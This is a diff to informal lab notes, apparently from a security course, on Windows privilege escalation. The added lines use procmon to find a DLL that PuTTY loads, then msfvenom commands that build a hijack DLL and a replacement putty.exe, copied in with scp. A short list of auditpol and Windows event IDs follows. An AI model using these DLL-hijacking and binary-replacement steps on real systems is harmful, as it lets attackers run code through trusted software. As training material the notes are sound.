@@ -32,7 +32,22 @@ procmon. filter. process name contains putty.exe, path contains .dll, result is 
 look at fliters and look for the dll (in this case sspicli.dll)
 student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll   //create dll that schtask may need
 PS C:\Users\student\Downloads> scp student@10.50.29.94:SSPICLI.dll 'C:\Program Files (x86)\Putty'
-if u can rename the exe, u can ... if u cant rename the exe there is a dll involved or sum like dat yur
+if u can rename the exe, u can replace. if u cant rename the exe there is a dll involved or sum like dat yur. dll hijacking
+rename Putty to whatever putty.bak in file explorer
+student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "hostname" > C:\Users\student\Desktop\whoami.txt' -f exe > putty.exe  //change command to whatever
+PS C:\Users\student\Downloads> scp student@10.50.29.94:putty.exe 'C:\Program Files (x86)\Putty'
+check desktop and file explorer
+
+auditpol /get /category:* | findstr /i "success failure"       //get what is being logged for every category
+
+4624/4625 - Successful/failed login
+
+4720 - Account created
+
+4672 - Administrative user logged on
+
+7045 - Service created
+
 
 
 
